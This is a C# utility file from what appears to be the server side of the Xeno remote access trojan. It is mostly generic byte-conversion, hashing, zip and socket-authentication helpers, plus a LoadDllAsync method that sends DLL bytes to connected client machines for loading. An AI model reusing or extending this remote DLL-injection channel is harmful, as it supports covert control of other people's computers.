using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_server
{
    class Utils
    {

        /// <summary>
        /// Converts a byte array to a long integer.
        /// </summary>
        /// <param name="data">The byte array to be converted.</param>
        /// <param name="offset">The zero-based byte offset in <paramref name="data"/> at which to begin converting.</param>
        /// <returns>The long integer converted from the specified byte array starting at the specified offset.</returns>
        /// <remarks>
        /// This method converts a byte array to a long integer, taking into account the endianness of the system.
        /// If the system is little-endian, the bytes are combined in little-endian order; otherwise, they are combined in big-endian order.
        /// </remarks>
        public static long BytesToLong(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return (long)data[offset] |
                       (long)data[offset + 1] << 8 |
                       (long)data[offset + 2] << 16 |
                       (long)data[offset + 3] << 24 |
                       (long)data[offset + 4] << 32 |
                       (long)data[offset + 5] << 40 |
                       (long)data[offset + 6] << 48 |
                       (long)data[offset + 7] << 56;
            }
            else
            {
                return (long)data[offset + 7] |
                       (long)data[offset + 6] << 8 |
                       (long)data[offset + 5] << 16 |
                       (long)data[offset + 4] << 24 |
                       (long)data[offset + 3] << 32 |
                       (long)data[offset + 2] << 40 |
                       (long)data[offset + 1] << 48 |
                       (long)data[offset] << 56;
            }
        }

        /// <summary>
        /// Converts a long integer to an array of bytes.
        /// </summary>
        /// <param name="data">The long integer to be converted.</param>
        /// <returns>An array of bytes representing the input <paramref name="data"/>.</returns>
        /// <remarks>
        /// This method converts the input long integer <paramref name="data"/> into an array of bytes. The method first checks the endianness of the system using BitConverter.IsLittleEndian. If the system is little-endian, the method populates the byte array <paramref name="bytes"/> with the bytes of the input long integer in little-endian order. If the system is big-endian, the method populates the byte array with the bytes of the input long integer in big-endian order.
        /// </remarks>
        public static byte[] LongToBytes(long data)
        {
            byte[] bytes = new byte[8];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
                bytes[4] = (byte)(data >> 32);
                bytes[5] = (byte)(data >> 40);
                bytes[6] = (byte)(data >> 48);
                bytes[7] = (byte)(data >> 56);
            }
            else
            {
                bytes[7] = (byte)data;
                bytes[6] = (byte)(data >> 8);
                bytes[5] = (byte)(data >> 16);
                bytes[4] = (byte)(data >> 24);
                bytes[3] = (byte)(data >> 32);
                bytes[2] = (byte)(data >> 40);
                bytes[1] = (byte)(data >> 48);
                bytes[0] = (byte)(data >> 56);
            }

            return bytes;
        }

        /// <summary>
        /// Asynchronously loads a DLL into the specified node and returns a boolean indicating the success of the operation.
        /// </summary>
        /// <param name="clientsubsock">The node where the DLL will be loaded.</param>
        /// <param name="dllname">The name of the DLL to be loaded.</param>
        /// <param name="dll">The byte array representing the DLL to be loaded.</param>
        /// <param name="Logcallback">An optional callback function for logging messages.</param>
        /// <returns>A boolean value indicating whether the DLL was loaded successfully.</returns>
        /// <exception cref="Exception">Thrown when an error occurs during the DLL loading process.</exception>
        public static async Task<bool> LoadDllAsync(Node clientsubsock, string dllname, byte[] dll, Action<string, Color> Logcallback = null)
        {
            try
            {
                clientsubsock.SetRecvTimeout(20000); // 20s timeout

                if (Logcallback != null)
                    Logcallback($"Loading {dllname} DLL...", Color.Blue);

                if (clientsubsock.SockType != 2)
                {
                    Logcallback?.Invoke($"Loading {dllname} DLL failed!", Color.Red);
                    return false;
                }

                // Step 1: Request DLL load
                byte[] loadRequest = new byte[] { 1 };
                await clientsubsock.SendAsync(loadRequest);

                // Step 2: Send DLL name using SocketHandler (length + compression + encryption handled)
                byte[] nameBytes = Encoding.UTF8.GetBytes(dllname);
                await clientsubsock.SendAsync(nameBytes);

                // Step 3: Receive server response
                byte[] dllinfo = await clientsubsock.ReceiveAsync();
                if (dllinfo == null)
                {
                    Logcallback?.Invoke($"No response from server while loading {dllname}!", Color.Red);
                    return false;
                }

                if (dllinfo[0] == 1)
                {
                    // Server requested DLL bytes, send them
                    await clientsubsock.SendAsync(dll);
                }
                else if (dllinfo[0] == 2)
                {
                    Logcallback?.Invoke($"Server refused to load {dllname} DLL!", Color.Red);
                    return false;
                }

                // Step 4: Wait for final confirmation
                byte[] finalResponse = await clientsubsock.ReceiveAsync();
                if (finalResponse == null || finalResponse[0] != 3)
                {
                    // Server sent failure message
                    byte[] errorMsg = await clientsubsock.ReceiveAsync();
                    string msg = errorMsg != null ? Encoding.UTF8.GetString(errorMsg) : "Unknown error";
                    Logcallback?.Invoke($"Starting {dllname} DLL failed!", Color.Red);
                    Logcallback?.Invoke(msg, Color.Red);
                    return false;
                }

                clientsubsock.ResetRecvTimeout();
                Logcallback?.Invoke($"{dllname} DLL loaded successfully!", Color.Green);
                return true;
            }
            catch (Exception ex)
            {
                Logcallback?.Invoke($"Exception loading {dllname} DLL: {ex.Message}", Color.Red);
                return false;
            }
        }


        /// <summary>
        /// Computes the SHA-256 hash value for the input string and returns the result as an array of bytes.
        /// </summary>
        /// <param name="input">The input string for which the SHA-256 hash is to be computed.</param>
        /// <returns>The SHA-256 hash value of the input string as an array of bytes.</returns>
        /// <remarks>
        /// This method uses the SHA256 algorithm to compute the hash value of the input string.
        /// The input string is first converted to an array of bytes using UTF-8 encoding.
        /// The SHA-256 algorithm is then applied to the input bytes to compute the hash value, which is returned as an array of bytes.
        /// </remarks>
        public static byte[] CalculateSha256Bytes(string input)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(input);
                byte[] hashBytes = sha256.ComputeHash(inputBytes);
                return hashBytes;
            }
        }

        /// <summary>
        /// Adds text to a ZipArchive entry with the specified name.
        /// </summary>
        /// <param name="archive">The ZipArchive to which the text will be added.</param>
        /// <param name="entryName">The name of the entry to be created in the ZipArchive.</param>
        /// <param name="text">The text to be written to the ZipArchive entry.</param>
        /// <remarks>
        /// This method creates a new entry with the specified name in the ZipArchive and writes the provided text to it using UTF-8 encoding.
        /// </remarks>
        public static void AddTextToZip(ZipArchive archive, string entryName, string text)
        {
            ZipArchiveEntry entry = archive.CreateEntry(entryName, CompressionLevel.Optimal);

            using (Stream stream = entry.Open())
            using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8))
            {
                writer.Write(text);
            }
        }

        /// <summary>
        /// Asynchronously sets the ID for type 2 node and returns the set ID.
        /// </summary>
        /// <param name="subnode">The node for which the ID needs to be set.</param>
        /// <returns>The set ID for the type 2 node.</returns>
        /// <remarks>
        /// This method sets the ID for a type 2 node by incrementing the SubNodeIdCount of its parent node and sending the set ID to the subnode using asynchronous operations.
        /// If the subnode's SockType is not 2, it returns -1.
        /// </remarks>
        public static async Task<int> SetType2setIdAsync(Node subnode)
        {
            if (subnode.SockType == 2)
            {
                int setID = subnode.Parent.SubNodeIdCount;
                subnode.Parent.SubNodeIdCount += 1;
                byte[] id = subnode.sock.IntToBytes(setID);
                byte[] opcode = new byte[] { 2 };
                byte[] data = subnode.sock.Concat(opcode, id);
                await subnode.SendAsync(data);
                await subnode.ReceiveAsync();
                return setID;
            }
            return -1;
        }

        /// <summary>
        /// Sends a byte array with opcode 3 to the specified subNode if the SockType is 2.
        /// </summary>
        /// <param name="subNode">The node to which the byte array with opcode 3 will be sent.</param>
        /// <exception cref="ArgumentNullException">Thrown when the subNode is null.</exception>
        /// <returns>An asynchronous task representing the sending of the byte array with opcode 3 to the subNode.</returns>
        /// <remarks>
        /// This method sends a byte array with opcode 3 to the specified subNode if the SockType property of the subNode is equal to 2.
        /// The method uses asynchronous programming to send the byte array and awaits the completion of the operation.
        /// </remarks>
        public static async Task Type2returnAsync(Node subNode) 
        {
            if (subNode.SockType == 2) 
            {
                byte[] opcode = new byte[] { 3 };
                await subNode.SendAsync(opcode);
            }
        }

        /// <summary>
        /// Connects to a socket, sets up a node using the provided key and ID, and returns the node.
        /// </summary>
        /// <param name="sock">The socket to connect to.</param>
        /// <param name="key">The byte array key used for setup.</param>
        /// <param name="ID">The ID used for authentication.</param>
        /// <param name="OnDisconnect">An optional action to be performed on disconnection.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the connection and setup process.</exception>
        /// <returns>A node representing the connection and setup, or null if the authentication fails or an error occurs.</returns>
        /// <remarks>
        /// This method asynchronously connects to the provided socket, creates a new node using the socket handler and key, and authenticates using the provided ID.
        /// If the authentication fails, null is returned. An optional action can be provided to be performed on disconnection.
        /// </remarks>
        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int ID, Action<Node> OnDisconnect = null)
        {
            Node conn;
            try
            {
                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
                if (!(await conn.AuthenticateAsync(ID)))
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
            return conn;
        }
    }
    public static class NetworkUtils
    {
        public static byte[] IntToBytes(int value)
        {
            byte[] bytes = BitConverter.GetBytes(value);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(bytes); // convert to network byte order
            return bytes;
        }

        public static int BytesToInt(byte[] bytes)
        {
            if (BitConverter.IsLittleEndian)
                Array.Reverse(bytes);
            return BitConverter.ToInt32(bytes, 0);
        }
    }
}
